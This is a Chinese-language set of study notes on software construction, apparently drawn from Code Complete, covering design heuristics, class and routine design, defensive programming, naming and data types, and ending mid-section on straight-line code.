过度工程：详细定义一种过度工程的方法，设计期望目标，避免有些类过度健壮，有些过于薄弱； 买or造的决策：采用现货供应的组件，还是自建组件，如果是后者，说明自建应该在哪些方面胜过现成的程序和组件； 复用的决策：如果使用已有的软件、用例、数据等，则应说明，如何对复用的软件进行加工，使之符合架构的目标； 变更策略：清楚的描述处理变更的策略，列出已经考虑过的有可能会增加的功能，并说明最有可能增加的功能，也是最容易实现的（因为已经提前考虑了）；（延迟策略：如果某些决定目前不构成风险，则越晚做出决策越好） 架构的总体质量：目标清楚表述、描述所有主要决策的动机、与编程语言无关、明确指出有风险的区域、包括多个视角（例如建筑的正视图、平面图、结构图等） 花费在前期准备上面的时间长度 正常占10-20%的工作量，花20-30%的时间；需求越是清晰稳定，越降低后续构建的成本，减少给构建带来负面的影响 如果需求不清晰，则有必要将需求分析做为一个独立的项目来做，好比建筑行业中，独立的聘请设计单位进行图纸的绘制一样，设计与施工分开； 关键的构建决策 选择编程语言 熟悉的语言比不熟悉的语言要高30%的效率； 高级的语言更有利于专注要表达的思想，而不是表达的细节（例如措词）； 编程约定：通过架构上的指导方针达到整体的协调统一，有利于团队协作和未来维护，包括变量名称、类的名称、子程序名称、格式约定、注释约定等，好比一幅画，如果由印象主义、古典主义、立体主义等多种风格构成，就会导致它的混乱和难懂； 你在技术浪潮中的位置： 早期：缺失的文档，不稳定的包，需要花相当多的时间关注工具本身； 后期：详细的文档，极少的BUG，可以用大部分时间编写功能； 深入一种语言去编程 可以用不同的方法实现相同的思想，重要的是，要有正确的思想； 软件构建中的设计 设计中的挑战 设计是一个险恶的问题，因为它只有在做的过程中，才能更多的暴露问题本身； 需要不断试错； 需要进行取舍和优先级排序； 在外界资源有限的条件下工作； 具有不确定性，同一个问题，三个人有三种不同的解决方法； 它是一个启发式的过程，即需要不断的尝试新方法； 它是在迭代中形成的； 关键的设计理念 管理复杂度：非常重要，软件的第一位的技术使命； 区分外在暂时的难题和内在本质的难题； 通过抽象，将系统分为多个子系统来降低复杂度；保持子程序的短小精悍，有助于减少思考的负担； 理想的设计特征 高扇入（被很多人依赖），低扇出（少依赖他人）； 最小的复杂度、精简性； 可拓展性：增强时不会破坏原有的结构（需要思考可能存在的拓展，需求中应考虑标注） 可移植性：可快速转移到其他系统使用，要么系统无关，要么针对具体系统设计单独增加一层抽象的接口； 可重用性：每个组成部分可以在其他系统中被使用； 层次性（多个等级结构），松散耦合（最少的通信渠道即是一个例子，即应低扇出），易于维护 使用标准的设计：减少使用古怪的东西，让别人熟悉容易理解和上手（如有可能，尽量使用简单通用的解法）； 设计的层次： 系统、子系统和包、类、数据和子程序、子程序内部； 严格限制不同子系统之间的通信；原因：越少的通信渠道，越便于维护（低扇出）； 常用的子系统：业务规则、数据库访问、用户界面、对系统的依赖性、应用程序； 设计构造块：启发式方法 找出现实世界中的对象：不要想系统能做什么，而是它在模仿谁； 确定对象及其属性 确认对象可以进行的操作； 确定对象可以对其他对象进行的操作； 确定对象哪些部分对其他对象不可见； 确定对象的公开接口和不公开接口； 继承：当继承能简化设计时考虑使用继承； 隐藏信息： 实现自增 id 的例子，用全局变量+一行语句，还是一个独立的函数； 从“应该隐藏什么”出发，去思考如何设计；原因：这样会让因内部变化而给外部引用，带来最小的变化；如果暴露过多的内部细节，会导致当出现变化时，外部也出现大量的变化；（内部应该尽量设计高的抽象） 应对变化： 思考最有可能出现变化的部分，花费最多的时间抽象它，以便当变化出现时，改动成本最小；最不可能出现变化的部分，则花费时间最少； 思考一个模块的最核心功能的最小集合，它变化的可能性最小；然后在这个集合的基础上进行扩展，延伸的附加功能，出现变化的概率逐渐变大； 常见的变化：业务规则、对硬件的依赖、输入输出、难度高的设计和构建、状态变量、非标准的语言特性； 保持松散耦合 耦合标准： 规模：连接的数量，越小越好； 可见性：连接的显著程序，越公开越明显越好； 灵活性：是否容易修改，越容易越好； 总结：模块越容易被其他模块调用，则它们之间的关系越松散（理想的情况下，模块对其他模块的依赖越小，越是自洽，它跟其他模块的耦合越小，即低扇出）； 耦合的种类 简单数据耦合：OK，只传一个或多个数据； 简单对象耦合：OK；只传一个简单对象； 对象参数耦合：一般，原因：需要了解对象具体有哪些参数，提高了复杂度（前后端的数据接口即是一个例子）； 语义上的耦合：非常差，原因：需要了解另外一个模块的规则（这种耦合非常可怕，维护成本非常高）； 设计模式 优点： 前人也遇到了相似的问题，并思考了好的解决方案。相比自己重新造轮子，采用他们的方案可以省去时间和犯错； 方便了团队的交流，原因：模式提供了更高抽象层次的思路，让沟通更快速； 缺点：避免为了模式而模式，强迫代码去适应模式，而没有认真思考两个场景是否匹配； 按王垠的观点，设计模式一书中的20个模式，在很多动态语言里面已经透明化了，即内置成为其特点的一部分，导致感觉不到它们的存在；而 Java 语言由于其不能传递函数的局限性，导致需要做一些模式的设计；因此千万不能本末倒置，以为一定要用设计模式才是高级的，事实上很有可能把一件简单的事情搞得复杂化了，反而让其他人看不懂代码； 其他启发方法 高内聚性：子程序内部的方法紧密围绕类的中心目标；原因：内聚程序越高，越容易理解和记住代码的功能所在；如果分散，则让人费解； 构造分层结构：当对复杂的事物进行分层后，可以将大脑从大量的细节中解放出来，只关注当前层次的关键信息，有利于更好的思考问题； 严格描述类契约：在类的对外接口调用过程中，详细描述一个需要遵守的规则，有利于减少错误的发生（示例：如果你提供数据x,y,z，并承诺让这些数据具备a,b,c 的特征，则我将基于约束8，9，10 执行操作 1，2，3）； 为测试而设计：问自己一个问题，如果为了方便更好的测试，系统会如何设计？原因：站在测试的角度进行思考，有可能会使得设计更加的规整，减少相互依赖和耦合，降低复杂度； 失败的案例：思考一遍前人失败过的案例，有利于避免在同一个地方摔倒； 有意识的选择绑定时间：将某个值，绑定到某个变量的时机；早绑定比较简单，但晚绑定则具备更多的灵活性； 创建中央控制点：将控制点放在一个集中的地方；原因：有利于后期的维护（例如将直接赋值设为变量的引用，将在一个统一的地方定义变量）； 画一个图：原因：当使用图形的时候，就会逼迫大脑进行抽象的思考； 考虑使用蛮力：优雅的算法固然很好，但蛮力经常也可以到达目的地，虽然不怎么优雅，但时间相差甚少； 保持设计的模块化：类似函数式编程，给定预定的输入，得到预期的输出，而不用管里面发生了什么；思考如何将一堆黑盒子组装成一个系统； 分配职责：思考一个对象应该为什么负责，不为什么负责； 启发方法的原则 不要卡在单一的方法上。如果一个方法行不通，尝试其他方法，UML图，草图，测试，伪代码等； 无须马上解决所有的问题。如果有些问题很难，将它们放一放，等过一段时间再回来看看； 设计实践 迭代：每一次迭代，每一次从上而下和从下而上的换位思考，每一次尝试一种新的解决思路，都会带来不一样的洞察力。使得再一次设计的方案比上一次更好；没有最好，永远只有更好； 分而治之：程序很大很复杂，不要一下子考虑全部东西。每次只集中只解决一小片问题即可； 自上而下（分解）和自下而上（合成）结合使用； 制作原型：如果一个问题的答案不够显得易见，则可以考虑建立一个小的原型去试验它；此处陷阱：试图将原型的代码用于生产；应对方法：用其他语言来实现原型； 合作设计：如果是为了找到更好的解决方案，则可以先将自己的解决思路分享给其他人，然后听取他们的思考和反馈；三个臭皮匠，顶个诸葛亮； 设计要做多少？ 取决于团队的经验丰富程度，如果高，则设计可低；如果低，则设计要高； 最大的设计风险，不来自于某个困难的问题，而是来自于对简单部分的轻视；很少出现因为设计过多而带来问题，问题常常来自那些设计不足的部分； 80%的时间应该用于寻找探索更好的设计方案，仅将20%的时间用来制作简单的文档，文档好看不重要，重要是好用； 记录设计成果 将设计文档插入到代码的注释段落中； 使用 Wiki 来记录；原因：特别方便异地的团队共享成果； 使用数码相机，将给一些草图拍照（大大减少了画正式图的时间，效果却很接近）； 写总结邮件：开会后，将开会内容整理一下，发给相关人员；原因：这样一旦有疑问，大家知道在哪里可以查阅； 保留设计挂图；原因：贴在某个地方，大家可以随时查看； 在适当的细节层，创建 UML 图； 可以工作的类 抽象数据类型 抽象数据类型（ADT）：ADT 的涵义其实相当广泛，它可以代表任何一个现实世界的实体，也即对象，它不仅含有数据，还包含了对数据的操作； 设计 ADT 时，尽量在最高的抽象层次上工作； 类是实现抽象的一种好方法，而 ADT 是实现类的基础；让我们可以专注一项事情上面，而忽略其他事情，不用关心它的细节，让我们更好的思考； 良好的类接口 设计类的第一步：设计接口，满足两点：合理的尽量高层次的抽象，隐藏抽象以下的细节； 原则 接口应该体现一致的抽象层次； 务必理解类所要实现的抽象是什么，并且要隐藏什么； 把不相关的信息，转移到其他类中； 提供成对的服务：但也不盲目增加反向操作； 尽可能让接口可编程，而不是表达语义：将规则转化成代码，让机器自动检查（例如使用 assert )（莫非即是防御性编程？），而不是靠语义约定，不然会埋下隐患； 不要添加与抽象不一致的公用成员进来；谨防在修改时，破坏了原来的抽象层次； 良好的封装 尽量限制类和成员的可达性：如果出现纠结的情况，遵循最严厉法； 不暴露成员数据； 类接口不包含类的实现细节：更好的做法，将类的接口和类的实现隔离开； 不对类的使用者做任何假设（防御性编程？） 避免使用友元类（因为友元类可以访问类的私有成员和保护成员，破坏了信息隐藏原则）； 即使子程序仅使用公用子程序，也不要放入接口；原因：会破坏抽象； 让阅读代码比编写代码更方便；原因：不要为了方便破坏抽象，这样会导致代码难以阅读和理解； 格外警惕从语义上破坏封装性：调用方代码没有依赖类的接口，而是依赖类的实现细节；原因：这样会导致严重的后果，当类的内部实现细节发现变化时，就会马上出现错误；抵制诱惑：当根据类接口文档看不懂如何使用这个类的时候，应该让作者重写文档，而不是自己分析类的实现，然后基于这个实现去调用它； 留意过于紧密的耦合关系：Demeter 法则，仅使用一个点法则（只能访问直接的朋友，不能访问朋友的朋友）； 设计和实现的问题 包含 通过包含来实现 has a 关系； 不到万不得已，不通过 private 继承来实现 has a 关系；原因：此时外层的包含类，可以访问 private 类的 protected 成员函数和数据，会破坏封装性，造成隐患； 警惕拥有超过 7 个数据成员的类；(如果超了，考虑创建子类） 继承 用 public 来实现 is a 关系；如果一个派生类，不打算遵守基类的全部接口，就不要使用继承；要么改成包含，要么考虑修改基类； 要么使用继承并详细说明，要么不要用它；如果某个类不可继承，在定义时写明不可继承（例如java 的 final） 遵循 LSP 替换原则（可替换原则）：派生类必须能够通过基类的接口进行访问，且调用者无须了解差异； 确保只继承需要继承的部分；原因：如果只想继承实现，而不想继承接口，应使用包含的方式； 不要覆盖一个“不可覆盖”的成员函数；原因：这样会给使用的时候带来困惑，埋下隐患； 共用的接口、数据、操作，放在继承树中尽可能高的位置；原因：这样派生类可以更容易调用它们；多高呢？高到再进一步会破坏抽象的位置； 只有一个实例的类是值得怀疑的；（单件模式除外） 只有一个派生类的基类，是值得怀疑的；（可能过度抽象了，避免想得太超前） 派生类覆盖了某个子程序，但其中没有任何操作，是值得怀疑的；原因：说明基类的子程序很可能设计的有问题，这个子程序可能应该是包含的关系（可有可无），而不是成员函数（必须有）； 避免过深的继承：尽量不超过2-3层，所有层数合计的派生类总数不超过7个； 尽量使用多态代替大量的类型检查；频繁使用 case 的时候，可能需要考虑使用多态； 避免多重继承； 四项基本规则 如果多个类共享数据，但不共享行为，应该让它们包含某个对象； 如果多个类共享行为，不共享数据，应该让它们继承基类，在基类中定义共用的子程序； 如果多个类既共享行为，也共享数据，应该让它们继承基类，并在基类中定义共用的数据和子程序； 当想让基类控制接口时，使用继承；当想自己控制接口时，使用包含； 成员函数和数据成员 子程序尽量少；原因：数量越多，出错率越高； 一次调用的子程序尽量少；（即低扇入）原因：扇入越高，出错越高； 避免间接调用，Demeter 法则；原因：耦合太高，维护修改麻烦； 禁止编译器产生不需要的默认方法（将 public 改为 private）目的：禁止调用方代码访问它们； 总则：尽量减少类与类之间的合作范围；目的：减少耦合； 构造函数 如果可能，尽量在所有构造函数中初始化所有数据成员；（防御式编程，避免引入不可控的因素）； 单件模式下，强制私有化构造函数；原因：避免构造函数被外部调用，导致单件模式失效；此处需配合公开的静态方法接口来实现； 优先使用深层拷贝（即 clone，浅层拷贝只复制了指针）原因：减少不可知的相互干扰和检查，大幅降低复杂度； 创建类的原因 为现实世界建模； 对抽象概念建模；例如形状的概念 降低复杂度； 隔离复杂度； 隐藏实现细节；原因：减少对实现细节的关注，可以减少代码间的耦合； 控制变动影响的范围； 隐藏全局数据； 让参数的传递更方便；（如果发现一个参数在多个子程序间传递，可能需要考虑将这个参数和相关子程序重新建一个类） 建立中心控制点； 为程序变动做好准备； 让代码易于重用； 方便模块化； 方便实现重构； 应该避免的类 万能类；失去了类的意义； 只有数据没有行为的类；可能适合将数据放到其他类中； 只有行为没有数据的类；可能适合将行为放到其他类中； 包：超越类 编程语言的进步，在于我们可以在越来越高的抽象层次上编程；最早是符号，后来是语句，再后来是函数，再后来是类，未来可能是包或模块； 高质量的子程序 使用子程序的原因 降低复杂度 提供容易理解的中间抽象； 减少重复的代码； 方便创建子类； 隐藏操作顺序； 隐藏指针操作； 简化布尔判断； 提高可移植性； 提高性能； 子程序的设计 原则：功能上的高内聚性（如果做不到，则应考虑拆这个子程序；尽量让人通过名字，即知道它是干嘛的，让它有自解释性） 不理想的内聚 顺序上的内聚性：包含特定顺序的操作，操作需要共享数据； 通信上的内聚性：只共享了相同的数据，但不同的操作之间没有任何联系； 临时的内聚性：需要同时执行然后被放到一起的操作； 混乱的内聚性：操作与操作之间完全无关； 逻辑上的内聚性：几个操作被放在一起，通过传入控制标志调用其中一个操作，而操作之间却没有关联； 好的子程序名字 描述所做的所有事情 对返回值有所描述； 长度合适 过程的命名使用动词+宾语 优先使用对仗词 1. 为常用操作制定命名规则；原因：方便团队协作，别人可以快速理解自己的子程序如何使用； 避免使用意义模糊的动词； 避免使用数字区分命名； 子程序的参数 按输入、修改、输出来安排参数的顺序； 如果几个子程序共用一些参数，让它们的顺序也保持一致；原因：降低学习成本； 不会使用的参数，去除掉； 状态变量或者错误变量，放在最后； 不要将参数当作工作变量，另外新建一个；原因：避免修改原始参数，然后不小心错误引用； 在接口中对参数的假定加以说明（定义时就说明，不要等子程序写完再回来补，因为那个时候已经忘了） 参数个数不超过7个； 参数用对象的部分值，还是整个对象？取决于哪一种更符合接口的抽象层次； 如果参数数量很多，可以考虑增加一个函数，用来将形式参数和实际参数映射起来；原因：这样可以避免因参数位置放错，导致的错误； 函数的返回值 如果函数内部有多条路径，应仔细检查每条路径的返回值；原因：避免返回不想要的结果； 不要返回函数内部数据的引用或指针；原因：函数结束后，内部数据销毁；应将返回值保存为类的数据成员，并提供访问器来读取这个数据 避免使用宏； 尤其是避免使用宏来替代函数； 防御式编程 警惕数据可能非法 检查所有外部数据；（如果出现错误应如何处理？是否设置报错规范？将报错信息写在返回值里面，抛出错误？） 检查函数参数； 断言与错误处理 一般二者用其一，如果程序很大很复杂，或者对可靠性要求很高，也可以结合着用； 建议 断言： 用于检查代码中的BUG； 用于验证前条件和后条件； 错误处理：处理可能发生的错误输入 高健壮性： 先用断言验证 再做错误处理； 错误处理技术 返回一个中性值；返回上一个正确的值；返回下一个正确的值；返回最接近的合法值； 把错误信息记录到日志中； 返回错误代码：缺点：需要确保依赖调用方会按错误代码处理； 调用统一的错误处理的子程序；(这种方式不错，例如，可以发送一个邮件出来，附上相关信息，并登记日志） 显示出错提示；缺点：有可能让界面相关代码变得混乱分散；有可能黑客会利用信息发现漏洞； 局部自行处理；缺点：同上； 关闭程序； 健壮性与正确性：根据场景而定；生命攸关的程度，正确性更重要；普通程序，用户更关心健壮性； 异常：当程序不知如何处理时，它会抛出异常，由程序的其他部分进行处理；异常提供了一个让错误不可能被忽视的办法 ，使得错误必须被处理； 只有在真正例外的情况下，才抛出异常；如果能够局部处理，则当下处理，不要乱抛； 避免在构造函数和构造函数中抛出异常；原因：此时抛异常，会导致资源泄漏；（运行构造函数，发现非法数据怎么办？是否应该在运行构造函数之前进行检查？） 在恰当的抽象层次抛出异常；原因：避免泄露程序的实现细节；对于异常的描述，应该合理抽象，不要透露有关的实现细节； 在异常消息中，加入所有能想到的关于导致异常出现的信息；原因：方便问题定位；（对内部使用的消息，则异常的消息应该尽量详细） 考虑创建一个统一的异常报告办法；例如异常的种类、如何处理、如何格式化异常信息等（嗯，非常有必要，可以提高效率）； 谨慎考虑是否需要使用异常，因为有时候直接让程序崩溃掉，是更好的做法； 隔栏：在数据进入内部之前，先对数据进行检查和清洗，有错误进行处理；之后，内部程序不再检查，假定它们都已经是安全的了； 进攻式编程：开发环境中，发生错误的地方，直接终止程序；生产环境中，则使用错误处理包容可能发生的错误，程序不终止； 保留多少防御式代码 保留检查重要错误的代码； 去掉检查细微错误的代码； 去掉会导致程序崩溃的代码； 保留可以让程序安全崩溃的代码；原因：这种类型的崩溃，不会带来大的损害； 保留可以记录错误信息的代码； 确认保留的错误提示信息是友好的； 伪代码编程 原则 用接近日常的语言来编写，而不是用编程的语言（可以考虑使用小黄鸭技术，即使用小黄鸭才能听懂的说法）； 用意图来编写，而不是用编程语言的语法元素； 在靠近尽量低的代码层次编写（一开始可以在高的抽象层次，然后逐步深入） 好处：方便迭代思路，方便变更，方便形成注释；方便他人理解代码意图； 设计子程序 检查先决条件：是否必需？目标是否清晰？是否与整体设计匹配？ 定义要解决的问题：已经有什么？要做什么？返回什么？ 起个好名字：如果名字很模糊，说明这个子程序可能也是功能模糊的，需要进一步拆解； 想想测试：站在测试的角度，想想要如何测试它；（给定正确输入&#x2F;边界输入&#x2F;错误输入，检查输出） 考虑错误处理：例如错误的输入（是否设计全局的统一错误处理）； 考虑是否已经有现成的库可以解决：避免重复造轮子； 考虑算法和数据类型：如果出现库都无法解决的问题，则应该考虑去查查算法书（先要有一本算法书）； 性能问题：除非是面向稀缺资源而设计，不然不考虑这个问题； 数据类型：如果数据操作是子程序的重点，则应该先把数据类型定义好； 编写伪代码：先写头注释，再写逻辑； 检查伪代码：先自己复查一下，然后想一下如何向别人解释这些伪代码，再对照一下伪代码，如果可以，可以找人来听听自己的解释，或者帮忙看看伪代码（或者使用传说中的小黄鸭技术）； 迭代伪代码：优化、分解（直至觉得再写下去是浪费时间）（这一步非常有必要，因为在伪代码上面迭代，要远远比真实的代码容易得多） 编写子程序的代码 将伪代码加上注释符，变成注释 写声明，加上头尾花括号； 在每行注释下面填充代码； 检查填充的代码是否需要进一步分解（如果段落很大，考虑分解它，单独另建一个子程序）； 检查代码 在脑海中检查：如果很难，表示程序写得太长了，考虑分解改得短一些；（代码是抽象的，更好的思考方式，是在脑海中用图形将它具象它，例如可以使用管道与房间的隐喻） 编译代码：仅在自己能够完全自信不会出错的情况下再编译；原因：一旦开始编译，心态便会转变，急着完成它，难以静下心来认真思考； 在调试器中逐行执行代码； 测试代码：通过测试用例、模拟数据对代码进行测试； 消除程序中的错误：如果一段代码漏洞百出，则应考虑重写；原因：出现这种情况，说明很可能没有弄明白这个子程序是要干嘛的； 收尾工作 检查接口：输入输出参数都参与计算，没有冗余参数； 检查质量：只干一件事、干好一件事、松散耦合（高扇入，低扇出）、防御式设计； 检查变量：未经定义的变量、未经初始化的对象、初始化后未被使用的对象（最好使用工具来帮忙做这个事情，一般IDE可以）； 检查语句和逻辑：错误的嵌套、死循环，资源泄漏； 检查布局：空白是否正确（建议团队内制定统一的布局风格）； 检查文档：注释、说明、描述等信息是否正确； 去除冗余注释； 使用变量的一般事项 变更定义 关闭隐式声明的功能；原因：很容易带来各种不是发觉的错误； 所有要用的变量都进行声明（最好使用IDE或者相应的工具帮忙做这项检查）； 遵循固定的命名原则；原因：避免同一个变量，出现两个命名； 利用第三方工具对变量声明进行检查；例如 jsLint； 初始化的原则 就近原则； 声明与初始化同时进行（即声明和定义同时）； 如果可能，尽量使用 const 或 final ；原因：可以防止变量被重新赋值，减少错误发生的可能性； 在类的构造函数中，初始化所有数据成员； 特别留意计数器和累加器，例如： i, j, k, sum, total 等，建议使用更具有意义的名字，命名花不了多少时间，但这样做是值得的； 如果变量会被循环多次使用，注意是否需要重新初始化； 如果编译器能够警告未经初始化的变量，打开它； 检查输入参数的合法性（同上章的防御式编程原则） 如需使用指针，可以安装内存检查工具来帮忙检查； 如需操作内存，在程序开始时，初始化工作内存（可以避免错误）； 作用域 变量尽量局部化：短跨度、短生存 原则 循环用到的变量，循环开始前再初始化； 变量直到使用前，才开始初始化（声明+赋值)；减少了变量的生命周期，也就减少了大脑的负担； 同一变量相关的语句，尽量放在一起；如有可能，提取成子程序； 开始先采用严格的可见性，后续根据需要逐步扩大；原因：由俭入奢易，由奢入俭难（一旦到处引开，修改起来就会变得很困难）； 持续性 变更的生命周期比预期的短；要假设数据已经过期，养成在使用前才开始声明和赋值的好习惯； 如有必要，使用断言对变量值进行检查； 绑定时间 晚的优点是灵活，缺点是增加复杂度，需要在灵活性和复杂度之间取得平衡； 从早到晚依次如下： 写代码时：使用硬编码赋值； 编译时：使用具名常量，使用时引用； 加载时：通过从外部读取文件； 对象实例化时：通过构造函数赋值； 实时：要用到时，再实时去获取； 数据类型与控制结构的关系 序列型数据，对应顺序语句； 选择型数据，对应判断语句； 迭代型数据，对应循环语句；（需要反复进行操作的数据，通常保存为窗口中的元素） 保持单一用途 避免让变量具有隐含的含义，比如一个表示页数的整数变量，即用 -1来表示出错，实际上出错是一种状态，应该使用一个单独的布尔变量； 确保使用了所有已声明的变量；原因：没有使用的变量，会为程序埋下隐患，增加出错概率； 变量名的力量 注意事项 变量名要能准确的代表所描述的事物； 长度控制在8-16个字符左右； 体现 what ，不体现 how，因为它是事物，不是动作（子程序才是一种动作）； 对位于全局空间的变量，加上限定词（例如ui_Employee, db_Employee）（如果语言支持，使用 namespace 来划分变量的作用域） 对于计算结果的值，事物名放前面，限定词放在后面，例如 applesTotal, applesEverage，而不是 totalApples，原因：名词可以让人第一眼认为它所代表的事物； 避免使用 Num，改成 total（总数场景），或 index（下标场景） 为特定类型的数据命名 循环变量：如果可以，避免使用 i,j,k，特别是有循环嵌套的时候；可以考虑改用高阶函数map, filter等； 状态变量：避免使用 flag，因为它啥也没说；改用能准确描述某种事物的状态的命名，例如 reportReady；（当发现自己需要猜测某段代码的含义时，表示需要更改变量的命名了） 布尔变量： 常用的典型：done, success, found, complete，如果可能，在这些名字前面加上前缀，例如：requestDone, deleteSuccess, recordFound, updateComplete； 使用肯定的变量名，而不是用否定的，例如应该避免使用: notFound, notDone，；原因：出现 if not notFound 就尴尬了； 枚举变量：给成员加上前缀，区分它们是一伙的，例如 color_red, color_blue, color_yellow；如果编程语言本身自动要求加前缀，则可以不再自己加； 具名常量：用能够准确代表事物本身的名字，而不是值本身； 制定命名规则 好处：低复杂、易交流、低认知、少错误、强关系； 使用场景：多人协作、工作交接、他人阅读、大型项目、长期项目 非正式的命名规则 区分变量名和子程序名：变量名用小写开头，子程序用大写开头；（但这样的话，貌似子程序跟类又容易混淆起来，一点区别：子程序是动词开头，而类是名词） 区分类和对象：类用大写字母开头，对象加上更明确的名字，例如：Widget 和 employeeWidget 标识全局变量，例如：g_color 标识成员变量，例如：m_employee，表示它是类的数据成员； 标识具名常量，例如：c_ramda 标识枚举类型元素，例如：e_weekday（ e 表示 enumerate） 如果语言不能保证输入参数不可修改，则使用 const 前缀加以标识输入参数，例如 constDate，这样当在程序中尝试为这个变量进行赋值时，就知道写错了 格式化命名：例如采用驼峰或者下划线中的一种（理论上来说，下划线的易读性比驼峰好，尤其是多个单词连在一起时）； 缩写 避免使用缩写； 如果必须使用缩写，建议做一份缩写的文档，每个人想要创建某个缩写的时候，就先登记到文档中；原因：由于文档比较麻烦，减少了创建一些不必要的缩写的情况；二是方便将来可以回顾查看；三是如果有人已经创建了某个缩写，可以避免重复； 应该避免的名字 不要在名字中使用数字； 避免使用相似含义的名字，例如 fileNumber 和 fileIndex 避免使用含义不同但相似名字的变量，例如 clientRecs 和 clientReps，建议为 clientRecords 和 clientReports 不要使用与变量的意义完全无关的听名字，例如用某个人的名字来命名； 基本数据类型 原则 不要比较不同类型的数据，应先将它们转换为同一种类型； 让类型转换显化，例如 x &#x3D; y + int(z) 不要使用神秘的数值，即不要将某个具体的值硬编码到代码中，例如 x &gt; 100，而应该使用具名常量来代替，例如 const max &#x3D; 100; x &gt; max（原因：数值硬编码很维护，而具名常量则很简单） 预防除零错误，凡是使用除法的地方，都要注意这条规则； 重视编译器的警告，并消除它们； 整数 检查整数溢出； 检查整数计算的中间结果溢出； 检查整数除法，例如 7&#x2F;10 &#x3D; 0 浮点数 避免数量级差距很大的数值进行加减运算；如果需要这么做，则先将它们排序，然后从最小的开始加起；这样虽然不能完全解决精度问题，但可以使用误差降到最小； 避免等量判断；原因：浮点数有些时候只是实际值的近似，所以判断相等很难；更好的做法是判断误差控制；比如设置 acceptDiff &#x3D; 0.0001，然后 if (a - b) &lt; acceptDiff 遇到对误差敏感的场景，例如计算金额，考虑换用更高精度的变量类型，例如双精度浮点值，或换用二进制编码的十进制（即 BCD），或者将小数运算，转成整数运算，或者使用语言内置的 Currency 类（货币）（如有的话） 字符串 避免使用神秘字符，改用具名常量来代替；原因：维护修改比较方便；国际化时翻译比较方便；内存资源紧张时，抽取单独存储比较方便； 如需国际化，使用 unicode； 在程序内部，统一使用一种编码，仅在输入输出的位置，进行转换； 布尔变量 可以用它对程序进行说明，例如：if( qty &lt; maxQty || date &gt; earlyDate) 改为： var qtyOK &#x3D; qty &lt; maxQty var dateOK &#x3D; data &lt; earlyDate if ( qtyOK &amp;&amp; dateOK) 这样一来，变量就变得更加清晰和容易理解了； 枚举类型 提高可靠性，减少出错，原因：只会在约定范围内取值； 方便扩展，只需在里面增加新元素； 方便阅读，例如 chooseColor &#x3D;&#x3D; colore_red, 比 chooseColor &#x3D;&#x3D; 1 要容易理解得多； 可以作为布尔变量的替代方案；原因：当情况超过两种时，布尔变量无法胜任； 具名常量 避免使用具体数值，避免使用具体字符，统一使用具名常量去替换它们，成为一名剔除具体数值或文字变量的狂热爱好者； 如果语言不支持常量，则考虑使用局部作用域的变量来达到相同的效果； 数组 当超过下标边界访问数组时，容易出现意想不到的错误，因此，如有可能，每次使用数组前，考虑是否可以使用集合、栈、队列等来替代； 如果实在不行，养成只对数组进行顺序访问的习惯；或者，如果语言支持，使用迭代器（例如 map, reduce 之类）来顺序访问，避免手工写循环； 自定义类型 如果可以的话，尽量创建自己的自定义类型，而不是使用预定义类型；原因：隐藏底层实现，增加一层数据抽象，减少信息到处分发，更便于维护和修改，增加可靠性避免出错； 原则：避免跟预定义类型冲突；避免修改预定义类型；考虑建一个类，而不是使用 typedef 自定义类型的命名，应该以现实世界的事物为导向，而不是以程序底层实现为导向； 不常见的数据类型 结构体（不清楚有哪些语言才支持，看完概念感觉结构很像一个只有属性值的对象） 可以用来明确数据关系（比如某些属性属于某些类型的成员） 可以更加方便维护（当成员有增减的时候，只需要改动结构体一个地方就可以了） 可以简化对数据块的操作，比如原来多个值的多条语句操作，现在变成了只需要一条语句就可以了； 可以更方便传递参数（将传递多个参数减少为只传递一个） 指针 指针存储的是一个内存地址，至于该地址里面的数据如何解读，取决于指针所标识的基类型； 指针的使用技巧 对指针的操作，封装在子程序或者类里面；原因：避免指针操作分散在程序各处，方便维护和修改； 同时声明和定义指针；原因：减少处在声明和定义中间的代码修改了指针； 在分配指针的作用域里面，删除指针（对称性操作）；原因：出了这个作用域的操作，结果不可预知，很容易出错； 使用指针前先进行检查；检查指针指向的变量；使用狗牌来标识头尾，以便检查出已销毁的指针； 多用额外的中间变量，来提供代码的清晰度；不要过分追求精简，对于程序来说，提高的性能极其有限，易读性下降带来的损失却很大； 删除链表中的指针时，注意顺序正确，避免出现链表断裂； 给指针一片自留地，这样它可以优雅的退出。避免溢出时，造成原有数据丢失的尴尬后果； 创建一份指针列表，指针销毁后，从列表中消除；使用指针前，则进行检查，确保指针包含在列表中，避免错误的使用（这条建议非常的有用）； 指针被删除或者释放后，将其至为空值；原因：当出现错误的引用时，能够通过编译器的报警，第一时间发现错误； C 语言中的指针 显式的指定指针的类型，而不是使用默认类型；原因：因为C语言不关心指针类型，只关心指向正确；因此，如果显式声明，则使用指针时，编译器会进行检查，尽早发现错误； 示例：char *pointerName, 或 int *pointerName 避免强制类型转换；原因：强制类型转换时，可能导致分配的空间变化，破坏了原有的数据； 在内存分配中，使用 sizeof 来确定变量的大小；原因：相当于增加了一层确认变量大小的抽象，由于 sizeof 是编译时动态计算的，这样可移植性很高，而且也不容易出错； 全局数据 隐患 使得代码不方便重用； 破坏了模块化的意义，让代码的复杂度上升 容易被无意间修改； 存在别名问题（当全局数据被作为子程序的参数进行传递时出现） 引入了初始化顺序的要求，增加了复杂度； 使用理由 模拟具名常量（原因：有些语言不内置支持，如 Python） 模拟枚举类型（原因：有些语言不内置支持，如 Python）（python 的 enumerate 函数或者 Enum 类，是否已经可以间接支持？） 简化对变量的引用（但是，应优先考虑通过访问器子程序来解决） 消除流浪数据（有时会存在一些过路的参数，只在后续的函数中引用）（此时有可能需要考虑是否拆分函数的功能，让其更简单一点） 保存全局数值 万不得已时 变量先设为局部，需要的时候再改为全局，而不是反过来； 区分全局数据和类变量，优先使用类变量； 优先使用访问器子程序； 通过访问器子程序访问全局数据的用法 只允许通过访问子程序来获取全局数据； 不要所有的全局数据都放在一起，而应该将它们分类一下； 访问子程序内部应该建立一个抽象，将各种方法归类一下，避免无意中修改到各个方法的实现细节； 访问子程序内部各方法的抽象层次应该一致（原因：这样让别人更加容易理解） 用锁定的方式，控制并发访问修改全局数据（如何实现呢？队列？） 降低使用全局数据风险的办法 建立一个命名规则，让人一眼就看出来某个数据是全局数据； 为全局数据建立一份用途的注释清单（好处：对团队中所有成员都有巨大的帮助）； 不要使用全局数据存储中间结果，只能存储最终结果；（感觉全局数据最好是一个不能变更的常量，这样可以极大的降低使用的风险） 避免将数据扔到一个大对象中，然后到处传递； 组织直线型代码 有顺序的语句 可能的情况下，最好写没有依赖关系的语句； 如果语句的执行必须有顺序要求，应该让这种依赖关系变得很明显；办法如下： 